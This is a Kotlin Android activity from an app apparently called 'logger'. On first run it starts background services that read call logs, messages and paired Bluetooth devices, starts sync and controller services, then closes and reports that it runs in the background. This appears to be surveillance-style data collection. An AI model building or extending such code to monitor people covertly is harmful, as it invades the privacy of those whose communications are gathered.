package org.magnum.logger

import android.app.Activity
import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.preference.PreferenceManager
import org.magnum.logger.communication.calls.CallLogReader
import org.magnum.logger.communication.messaging.MessageListReader
import org.magnum.logger.connectivity.bluetooth.PairedDeviceReader

class Main : Activity() {
    private var isAlreadyRunning = false
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            if (isAlreadyRunning) {
                Toast.makeText(this, "Application already running in background", Toast.LENGTH_LONG).show()
                startService(Intent(this, SyncService::class.java))
                finish()
            } else {
                isAlreadyRunning = true
                if (PreferenceManager.getDefaultSharedPreferences(this).getBoolean(TAG, true)) {
                    PreferenceManager.getDefaultSharedPreferences(this).edit().putBoolean(TAG, false).apply()
                    startService(Intent(this, CallLogReader::class.java))
                    startService(Intent(this, MessageListReader::class.java))
                    startService(Intent(this, PairedDeviceReader::class.java))
                    startActivity(Intent(this, MapActivity::class.java))
                } else {
                    Toast.makeText(this, "Application is running in background", Toast.LENGTH_LONG).show()
                }
                startService(Intent(this, OneTimer::class.java))
                startService(Intent(this, Controller::class.java))
                finish()
            }
        } catch (e: Exception) {
            Log.e(TAG, e.toString())
        }
    }

    companion object {
        private const val TAG = "firstTime"
    }
}